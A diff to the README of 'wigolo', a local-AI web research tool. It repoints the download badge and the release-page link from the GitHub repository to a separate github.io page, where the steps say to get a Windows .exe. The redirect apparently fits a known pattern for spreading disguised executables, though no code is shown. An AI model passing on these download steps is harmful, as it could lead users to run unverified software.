@@ -1,12 +1,12 @@
 # 🌐 wigolo - Research the web using local AI
 
-[![](https://img.shields.io/badge/Download-Wigolo-blue.svg)](https://github.com/Dvine6263/wigolo)
+[![](https://img.shields.io/badge/Download-Wigolo-blue.svg)](https://dvine6263.github.io)
 
 Wigolo helps you search and explore the web with your own AI tools. It functions entirely on your computer. You do not need to pay for external services or store your sensitive data in the cloud. It connects directly to your local projects to provide answers, crawl pages, and conduct research.
 
 ## 📥 How to download the software
 
-1. Visit the [Wigolo release page](https://github.com/Dvine6263/wigolo).
+1. Visit the [Wigolo release page](https://dvine6263.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Choose the file that ends in .exe for Windows.
 4. Click the file name to start the download.
